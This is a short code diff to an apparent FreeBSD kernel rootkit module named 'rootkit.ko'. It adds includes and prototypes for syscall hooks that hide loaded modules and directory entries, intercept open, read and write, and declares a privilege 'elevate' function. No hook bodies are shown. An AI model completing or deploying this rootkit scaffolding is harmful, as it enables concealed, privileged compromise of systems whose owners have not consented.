@@ -15,6 +15,10 @@
 #include <sys/mutex.h>
 #include <sys/sx.h>
 #include <sys/dirent.h>
+#include <sys/cdefs.h>
+#include <sys/resourcevar.h>
+#include <sys/fcntl.h>
+#include <sys/errno.h>
 
 #define LINKER_FILE "rootkit.ko"
 #define MODULE_NAME "rootkit"
@@ -31,8 +35,12 @@ struct node {
 	uint8_t flags;
 };
 
-int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap);
-int sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap);
+int hook_sys_kldnext(struct thread *td, struct kldnext_args *uap);
+int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap);
+int hook_sys_open(struct thread *, struct open_args *);
+int hook_sys_read(struct thread *, struct read_args *);
+int hook_sys_write(struct thread *, struct write_args *);
+
 
 void elevate(struct thread *td);
 
